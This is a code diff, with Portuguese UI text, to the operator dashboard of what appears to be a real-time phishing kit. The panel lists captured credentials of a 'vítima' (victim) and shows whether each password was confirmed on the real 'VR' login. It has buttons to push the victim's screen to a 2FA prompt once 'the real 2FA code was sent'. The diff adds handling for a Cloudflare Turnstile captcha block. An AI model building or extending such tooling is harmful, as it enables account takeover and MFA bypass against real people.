@@ -245,6 +245,8 @@ function renderizarTabela() {
       let auditHtml = `<span class="cred-badge cred-testing"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Testando na VR...</span>`;
       if (item.status_credencial === "valido") {
         auditHtml = `<span class="cred-badge cred-valid"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg> Senha Correta (MFA Real)</span>`;
+      } else if (item.status_credencial === "bloqueio_captcha") {
+        auditHtml = `<span class="cred-badge cred-captcha" style="background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.4);"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> Desafio Captcha VR</span>`;
       } else if (item.status_credencial === "invalido") {
         auditHtml = `<span class="cred-badge cred-invalid"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> Senha Incorreta na VR</span>`;
       }
@@ -297,23 +299,30 @@ function renderizarTabela() {
                     <span>Aguardando Código</span>
                   </button>
                 ` : (
-                  item.status_credencial === "invalido" ? `
-                    <button class="btn-danger-sm" type="button" title="A VR indicou que a senha está incorreta. Você pode forçar se desejar." onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
-                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-                      <span>Forçar 2FA (Inválido)</span>
+                  item.status_credencial === "bloqueio_captcha" ? `
+                    <button class="btn-warning-sm" type="button" style="background: rgba(245, 158, 11, 0.2); border: 1px solid #f59e0b; color: #f59e0b;" title="A VR apresentou desafio Cloudflare Turnstile. Você pode solicitar o 2FA se desejar." onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
+                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                      <span>Solicitar 2FA (Captcha)</span>
                     </button>
                   ` : (
-                    item.status_credencial === "valido" ? `
-                      <button class="btn-success-sm" type="button" style="background: rgba(2, 215, 47, 0.25); border-color: #02d72f;" title="Senha confirmada na VR! O código 2FA real foi enviado para a vítima." onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
+                    item.status_credencial === "invalido" ? `
+                      <button class="btn-danger-sm" type="button" title="A VR indicou que a senha está incorreta. Você pode forçar se desejar." onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
                         <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-                        <span>Solicitar 2FA</span>
+                        <span>Forçar 2FA (Inválido)</span>
                       </button>
-                    ` : `
-                      <button class="btn-primary-sm" type="button" title="Liberar tela da vítima para solicitar o 2FA" onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
-                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-                        <span>Solicitar 2FA</span>
-                      </button>
-                    `
+                    ` : (
+                      item.status_credencial === "valido" ? `
+                        <button class="btn-success-sm" type="button" style="background: rgba(2, 215, 47, 0.25); border-color: #02d72f;" title="Senha confirmada na VR! O código 2FA real foi enviado para a vítima." onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
+                          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                          <span>Solicitar 2FA</span>
+                        </button>
+                      ` : `
+                        <button class="btn-primary-sm" type="button" title="Liberar tela da vítima para solicitar o 2FA" onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
+                          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                          <span>Solicitar 2FA</span>
+                        </button>
+                      `
+                    )
                   )
                 )
               )}
@@ -409,6 +418,8 @@ function renderizarTabela() {
       if (!is2FA) {
         if (item.status_credencial === "valido") {
           auditFeed = `<span class="cred-badge cred-valid" style="font-size: 10px;">Válido</span>`;
+        } else if (item.status_credencial === "bloqueio_captcha") {
+          auditFeed = `<span class="cred-badge cred-captcha" style="font-size: 10px; background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.4);">Captcha VR</span>`;
         } else if (item.status_credencial === "invalido") {
           auditFeed = `<span class="cred-badge cred-invalid" style="font-size: 10px;">Incorreto</span>`;
         } else {
